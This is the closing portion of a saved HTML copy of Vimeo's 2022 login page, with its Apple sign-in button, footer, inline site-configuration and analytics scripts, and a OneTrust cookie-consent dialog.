                        <div class="login-btn__icon-container">
                            <img src="./apple.svg" class="apple-icon">
                        </div>
                        <div class="login-btn__message">
                            Log in with Apple                        </div>
                    </span>
                </span>
            </button>
        </div>
            <input type="hidden" name="token" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"><input name="token" type="hidden" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"></form>

    <small class="row txt_md login_text">
        Don’t have an account?        <a data-modal-content="https://vimeo.com/join?ssl=0&amp;iframe=0&amp;popup=0&amp;player=0&amp;product_id=0&amp;activate=0" class="iris_link" href="https://vimeo.com/join?ssl=0&amp;iframe=0&amp;popup=0&amp;player=0&amp;product_id=0&amp;activate=0">
            Join        </a>
    </small>
</div>
        
            </div>
</div>

    <small class="row txt_sm legal_copy hide l-hide">
        By joining Vimeo, you agree to our <a href="https://vimeo.com/terms" class="iris_link" target="_blank">Terms of Service</a>, <a href="https://vimeo.com/privacy" class="iris_link" target="_blank">Privacy Policy</a> and <a href="https://vimeo.com/cookie_policy" class="iris_link" target="_blank">Cookie Policy.</a>    </small>

        </div>
    </div></article>
    <div class="video_wrapper">
            <video class="video js-background_video " muted="" loop="">
          <source src="https://vimeo.com//vimeo-hp-videos.global.ssl.fastly.net/2/2-vp9.webm" type="video/webm; codecs=vp9">
          <source src="https://vimeo.com//vimeo-hp-videos.global.ssl.fastly.net/2/2-vp8.webm" type="video/webm">
          <source src="https://vimeo.com//vimeo-hp-videos.global.ssl.fastly.net/2/2.mp4" type="video/mp4">
        </video>
  </div>

<div class="video_credit">
  <p class="title"><a href="https://vimeo.com/87701971" class="iris_link iris_link--opaque-reverse">Yosemite II</a></p>
  <p class="byline"><a href="https://vimeo.com/projectyose" class="iris_link iris_link--opaque-reverse">from Project Yosemite</a></p>
</div>
</div>


                </div>
            
<footer class="footer_v2 footer_v2--responsive">
        
        <section class="footer_v2__auxiliary footer_v2__auxiliary--transparent ">

    <div class="footer_v2__legal">
        <div class="footer_v2__auxiliary-content">
            <p>© 2022 Vimeo.com, Inc. All rights reserved.</p>
        </div>
        <ul class="footer_v2__legal-list">
            <li class="footer_v2__legal-list-item">
                <a class="iris_link iris_link--opaque" href="https://vimeo.com/terms" title="Terms &amp; Conditions">
                    Terms                </a>
            </li>
            <li class="footer_v2__legal-list-item">
                <a class="iris_link iris_link--opaque" href="https://vimeo.com/privacy" title="Privacy Policy">
                    Privacy                </a>
            </li>
            <li class="footer_v2__legal-list-item">
                <a class="iris_link iris_link--opaque" href="https://vimeo.com/privacy/california-privacy" title="CA Privacy">
                    CA Privacy                </a>
            </li>
                        <li class="footer_v2__legal-list-item">
                <a class="iris_link iris_link--opaque" href="https://vimeo.com/dmca" title="Copyright Information">
                    Copyright                </a>
            </li>
            <li class="footer_v2__legal-list-item">
                <a class="iris_link iris_link--opaque" href="https://vimeo.com/cookie_policy" title="Learn more about how Vimeo uses cookies">
                    Cookies                </a>
            </li>
        </ul>
    </div>

    <div class="footer_v2__filters footer_v2__auxiliary-content">
        <span class="language">
            Language:
            <a class="iris_link iris_link--opaque" href="#language" onclick="vimeo.Modal.create({content: '/settings/locale', size: 'small'}); return false;" title="Choose a different language">English</a>
        </span>

                    <span class="footer_v2__filter">Mature content filter: </span><a class="iris_link iris_link--opaque footer_v2__filters__lang contentfilter js-footer_contentfilter_link" href="javascript:void(0)" onclick="vimeo.Modal.create({content: '/settings/contentrating'})" title="Change your mature content filter">None</a>
            </div>

</section>
</footer>
        

        
        
<script>
    var __fa = __fa || [];
    /**
     * Because single page applications such as the app shell will be tracking
     * Fatal Attraction page views on React lifecycle hooks (componentDidMount)
     * we want to avoid dispatching the pageview event from the PHP template
     * and defer this sort of tracking logic to the front end.
     *
     * This check allows us to declare in a controller whether or not we
     * want to dispatch that preliminary pageview.
     *
     * The property is additive only, as to not affect existing pageviews.
     */
            __fa.push(['trackPageview']);
    
    /**
     * Add server side ABLincoln experiments to GTM data layer.
     */
            (function () {
            if (window._gtm) {
                var ablincoln_assignments = JSON.parse('[{"namespace_id":812,"parameter_name":"show_redesign","parameter_value":"control","user_saw_experiment":false},{"namespace_id":857,"parameter_name":"pricing_packaging","parameter_value":"control","user_saw_experiment":false},{"namespace_id":857,"parameter_name":"pricing_packaging","parameter_value":"control","user_saw_experiment":false},{"namespace_id":392,"parameter_name":"plan_price_increase","parameter_value":"control","user_saw_experiment":false}]');
                var user_seen_assignments = ablincoln_assignments.filter(function(assignment) {
                    return assignment.user_saw_experiment;
                });
                window._gtm.push({
                    'ablincoln_assignments': user_seen_assignments,
                });
                window._gtm.push({
                    event: 'ablincoln_assignments_complete',
                });
            }
        })();
    
        var _extend = function(){for(var r=arguments[0],n=1,e=arguments.length;e>n;n++){var t=arguments[n];for(var a in t)t.hasOwnProperty(a)&&(r[a]=t[a])}return r};

        var CSS_DIR = 'https://f.vimeocdn.com/styles/css_opt/',
        JS_DIR = 'https://f.vimeocdn.com/js_opt/',
        IMAGE_DIR = 'https://f.vimeocdn.com/images_v6/',
        FONT_DIR = 'https://f.vimeocdn.com/fonts/',
        SVG_DIR = 'https://f.vimeocdn.com/svg/',
                BUILD_HASH = 'c8957';

    
        var vimeo = _extend((window.vimeo || {}), {"app_version":"v6","domain":"vimeo.com","url":"vimeo.com","cur_user":false,"origin_user_id":null,"origin_user":false,"is_mobile":false,"is_record_tool_supported":false});
    vimeo.config = _extend((vimeo.config || {}), {"auth_page":"login","locale":"en","omnisearch_jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NTg3MTk3NDAsInVzZXJfaWQiOm51bGwsImFwcF9pZCI6NTg0NzksInNjb3BlcyI6InB1YmxpYyBwcml2YXRlIGRlbGV0ZSIsInRlYW1fdXNlcl9pZCI6bnVsbH0.V3YvprTMuqL5RjuHx090m_fGgDnyq6TURZFwLXSGpak","omnisearch_user":null,"api_url":"api.vimeo.com","has_video_library_search":false,"magisto_api_host":"vimeo.magisto.com","has_public_search_disabled":false,"has_no_vls_on_enter":false,"has_auto_closed_captions":false,"has_ocr_search":false});

        var __i18nLocale = 'en';
    var localeConfig = {
        lang: 'en',
        'Date': {
            months: ["January","February","March","April","May","June","July","August","September","October","November","December"],
            months_abbr: ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],
            days: ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],
            days_abbr: ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],

            // Culture's date order: MM/DD/YYYY
            dateOrder: ['date', 'month', 'year'],
            shortDate: '%d/%m/%Y',
            shortTime: '%I:%M%p',
            AM: 'AM',
            PM: 'PM',
            firstDayOfWeek: 0,

            // Date.Extras
            ordinal: function(dayOfMonth){
                return dayOfMonth;
            }
        },
        'DatePicker': {
            select_a_time: "Select a time",
            use_mouse_wheel: "Use the mouse wheel to quickly change value",
            time_confirm_button: "OK",
            apply_range: "Apply",
            cancel: "Cancel",
            week: "Wk"        },
                'Number': {
            decimal: '.',
            group: ',',
            currency: {
                prefix: '$'
            }
        },
        'FormValidator': {"required":"This field is required.","requiredChk":"This field is required."}    };

    var fullLocale = '';

    
        var Copy = {translate:function(t,i,u){var e='object'!=typeof this.dict[t]?this.dict[t]:i?this.dict[t].plural:this.dict[t].singular;return'object'==typeof u&&(e=this.substitute(e,u)),e},substitute:function(t,i){return void 0!==t.substitute?t.substitute(i):t.replace(/\\?\{([^{}]+)\}/g,function(t,u){return'\\'==t.charAt(0)?t.slice(1):null!=i[u]?i[u]:''})},dict:{}};
    Copy.dict = {"did_you_mean_email":"Did you mean <em>{SUGGEST}<\/em>?","email_password_mismatch":"Email and password do not match","oops_try_again":"Oops! Something went wrong. Please try again.","just_now":"just now","seconds_ago":{"singular":"{COUNT} second ago","plural":"{COUNT} seconds ago"},"minutes_ago":{"singular":"{COUNT} minute ago","plural":"{COUNT} minutes ago"},"hours_ago":{"singular":"{COUNT} hour ago","plural":"{COUNT} hours ago"},"open_comment_box":"Add new comment instead &raquo;","url_unavailable":"Sorry, this url is unavailable.","unsaved_changes_generic":"You have unsaved changes, are you sure you wish to leave?","add":"Add","remove":"Remove","select":"Select","no_followers_for_letter":"You don&rsquo;t follow anyone that begin with the letter &ldquo;{PAGE_LETTER}&rdquo;","share_limit_reached":"You have reached the maximum number of users to share with.","at_least_one":"There must be at least one user.","available":"Available","unavailable":"Unavailable","browse_error_generic":"Sorry, there was an error","browse_error_no_videos":"Sorry, no videos found","follow":"Follow","following":"Following","unfollow":"Unfollow","unfollowing":"Unfollowing","count_comments":{"singular":"{COUNT} comment","plural":"{COUNT} comments"},"first_comment":"Be the first to comment\u2026","no_comments_for_you":"Forbidden. You cannot post comments on this page.","oops":"Oops!","player_try_again":"That wasn't supposed to happen. Please try again in a few minutes.","duration_input_min_duration":"The duration cannot be less than {MIN_DURATION}.","duration_input_max_duration":"The duration cannot be greater than {MAX_DURATION}.","duration_input_invalid_characters":"0-9 and : are the only acceptable inputs.","close":"Close","expand":"Expand","loading":"Loading...","top":"top","advanced_search":"Advanced Search","no_suggestions":"No suggestions","recent_searches":"Recent Searches","search_all":"Search All of Vimeo","email_and_password":"Please enter your email and password","email_address":"Please enter a valid email address","name_email_and_password":"Please enter your name, email, and password","enter_valid_otp":"Please enter a valid code"};
</script>


   
<div id="lightbox_container" class="default_lightbox null" style="display: none; position: fixed; left: 301px; top: 158px;"><div id="lightbox_content" class="lightbox_content" style="width: auto; height: auto;"></div></div><div id="lightbox_overlay" class="lightbox_overlay" style="display: none;"></div><style>.qc-cmp-showing { visibility: hidden !important; } body.didomi-popup-open { overflow: auto !important; } #didomi-host { visibility: hidden !important; }</style><div id="onetrust-consent-sdk"><div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div><div id="onetrust-pc-sdk" class="otPcCenter ot-hide ot-fade-in" aria-modal="true" role="alertdialog" lang="en" aria-label="Privacy Preference Center"><!-- Close Button --><div class="ot-pc-header"><!-- Logo Tag --><div class="ot-pc-logo" role="img" aria-label="Company Logo" style="background-image: url(&quot;https://cdn.cookielaw.org/logos/static/ot_logo.png&quot;);
                    background-position: left;"></div><button id="close-pc-btn-handler" class="ot-close-icon" aria-label="Close"></button></div><!-- Close Button --><div id="ot-pc-content" class="ot-pc-scrollbar"><h2 id="ot-pc-title">Privacy Preference Center</h2><div id="ot-pc-desc">When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.
                <br><a href="https://cookiepedia.co.uk/giving-consent-to-cookies" class="privacy-notice-link" rel="noopener" target="_blank" aria-label="More information about your privacy, opens in a new tab">More information</a></div><button id="accept-recommended-btn-handler">Allow All</button><section class="ot-sdk-row ot-cat-grp"><h3 id="ot-category-title"> Manage Consent Preferences</h3><div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0002"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0002" aria-labelledby="ot-header-id-C0002"></button><!-- Accordion header --><div class="ot-acc-hdr"><div class="ot-plus-minus"><span></span><span></span></div><h4 class="ot-cat-header" id="ot-header-id-C0002">Performance Cookies</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0002" id="ot-group-id-C0002" aria-checked="true" role="switch" class="category-switch-handler" data-optanongroupid="C0002" checked="" aria-labelledby="ot-header-id-C0002"> <label class="ot-switch" for="ot-group-id-C0002"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Performance Cookies</span></label> </div></div><!-- accordion detail --><div class="ot-acc-grpcntr ot-acc-txt"><p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">These cookies allow us to count visits, identify traffic sources and understand how our services are used to measure and improve performance. If you do not allow these cookies, we will not know when you visited our site and we will not be able to monitor its performance.</p></div></div><div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0004"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0004" aria-labelledby="ot-header-id-C0004"></button><!-- Accordion header --><div class="ot-acc-hdr"><div class="ot-plus-minus"><span></span><span></span></div><h4 class="ot-cat-header" id="ot-header-id-C0004">Targeting Cookies</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0004" id="ot-group-id-C0004" aria-checked="true" role="switch" class="category-switch-handler" data-optanongroupid="C0004" checked="" aria-labelledby="ot-header-id-C0004"> <label class="ot-switch" for="ot-group-id-C0004"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Targeting Cookies</span></label> </div></div><!-- accordion detail --><div class="ot-acc-grpcntr ot-acc-txt"><p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0004">Our advertising partners may set these cookies on our site. They can be used to show you our ads on third-party sites, measure the effectiveness of those ads, or prevent ads from being shown to you. They do not store personal information directly, but rather uniquely identify your browser and device. If you do not allow these cookies, you will not receive targeted advertising.</p></div></div><div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0003"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0003" aria-labelledby="ot-header-id-C0003"></button><!-- Accordion header --><div class="ot-acc-hdr"><div class="ot-plus-minus"><span></span><span></span></div><h4 class="ot-cat-header" id="ot-header-id-C0003">Functional Cookies</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0003" id="ot-group-id-C0003" aria-checked="true" role="switch" class="category-switch-handler" data-optanongroupid="C0003" checked="" aria-labelledby="ot-header-id-C0003"> <label class="ot-switch" for="ot-group-id-C0003"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Functional Cookies</span></label> </div></div><!-- accordion detail --><div class="ot-acc-grpcntr ot-acc-txt"><p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0003">These cookies improve functionality and personalization. They may be set by us or by other third-party providers whose services we add to our pages. If you do not allow these cookies, some or all of these additional functions may not work properly.</p></div></div><div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0001"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0001" aria-labelledby="ot-header-id-C0001"></button><!-- Accordion header --><div class="ot-acc-hdr ot-always-active-group"><div class="ot-plus-minus"><span></span><span></span></div><h4 class="ot-cat-header" id="ot-header-id-C0001">Strictly Necessary Cookies</h4><div class="ot-always-active">Always Active</div></div><!-- accordion detail --><div class="ot-acc-grpcntr ot-acc-txt"><p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">These cookies are necessary for the website to function and cannot be disabled. You may be able to configure your Internet browser to block strictly necessary cookies. However, if you block cookies in this category, which do not collect or store any personal information, this could affect some parts of the website and cause it to function incorrectly.
</p></div></div><!-- Groups sections starts --><!-- Group section ends --><!-- Accordion Group section starts --><!-- Accordion Group section ends --></section></div><section id="ot-pc-lst" class="ot-hide ot-hosts-ui ot-pc-scrollbar"><div id="ot-pc-hdr"><div id="ot-lst-title"><button class="ot-link-btn back-btn-handler" aria-label="Back"><svg id="ot-back-arw" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 444.531 444.531" xml:space="preserve"><title>Back Button</title><g><path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                    l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                    c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                    s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                    L213.13,222.409z"></path></g></svg></button><h3>Performance Cookies</h3></div><div class="ot-lst-subhdr"><div class="ot-search-cntr"><p role="status" class="ot-scrn-rdr"></p><label for="vendor-search-handler" class="ot-scrn-rdr"></label> <input id="vendor-search-handler" type="text" name="vendor-search-handler"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110" aria-hidden="true"><title>Search Icon</title><path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
            s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
            c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
            s-17-7.626-17-17S14.61,6,23.984,6z"></path></svg></div><div class="ot-fltr-cntr"><button id="filter-btn-handler" aria-label="Filter" aria-haspopup="true"><svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 402.577 402.577" xml:space="preserve"><title>Filter Icon</title><g><path fill="#fff" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
      c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
      c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
      C402.765,25.895,404.093,19.231,400.858,11.427z"></path></g></svg></button></div><div id="ot-anchor"></div><section id="ot-fltr-modal"><div id="ot-fltr-cnt"><button id="clear-filters-handler">Clear</button><div class="ot-fltr-scrlcnt ot-pc-scrollbar"><div class="ot-fltr-opts"><div class="ot-fltr-opt"><div class="ot-chkbox"><input id="chkbox-id" type="checkbox" aria-checked="false" class="category-filter-handler"> <label for="chkbox-id"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></div></div><div class="ot-fltr-btns"><button id="filter-apply-handler">Apply</button> <button id="filter-cancel-handler">Cancel</button></div></div></div></section></div></div><section id="ot-lst-cnt" class="ot-host-cnt ot-pc-scrollbar"><div id="ot-sel-blk"><div class="ot-sel-all"><div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span class="ot-li-hdr">Leg.Interest</span></div><div class="ot-sel-all-chkbox"><div class="ot-chkbox" id="ot-selall-hostcntr"><input id="select-all-hosts-groups-handler" type="checkbox" aria-checked="false"> <label for="select-all-hosts-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-vencntr"><input id="select-all-vendor-groups-handler" type="checkbox" aria-checked="false"> <label for="select-all-vendor-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-licntr"><input id="select-all-vendor-leg-handler" type="checkbox" aria-checked="false"> <label for="select-all-vendor-leg-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></div></div></div><div class="ot-sdk-row"><div class="ot-sdk-column"></div></div></section></section><div class="ot-pc-footer"><div class="ot-btn-container"><button class="ot-pc-refuse-all-handler">Reject All</button> <button class="save-preference-btn-handler onetrust-close-btn-handler">Confirm My Choices</button></div><!-- Footer logo --><div class="ot-pc-footer-logo"><a href="https://www.onetrust.com/products/cookie-consent/" target="_blank" rel="noopener noreferrer" style="background-image: url(&quot;https://cdn.cookielaw.org/logos/static/poweredBy_ot_logo.svg&quot;);" aria-label="Powered by OneTrust Opens in a new Tab"></a></div></div><!-- Cookie subgroup container --><!-- Vendor list link --><!-- Cookie lost link --><!-- Toggle HTML element --><!-- Checkbox HTML --><!-- plus minus--><!-- Arrow SVG element --><!-- Accordion basic element --><span class="ot-scrn-rdr" aria-atomic="true" aria-live="polite"></span><iframe class="ot-text-resize" title="onetrust-text-resize" style="position: absolute; top: -50000px; width: 100em;" aria-hidden="true"></iframe></div></div></body></html>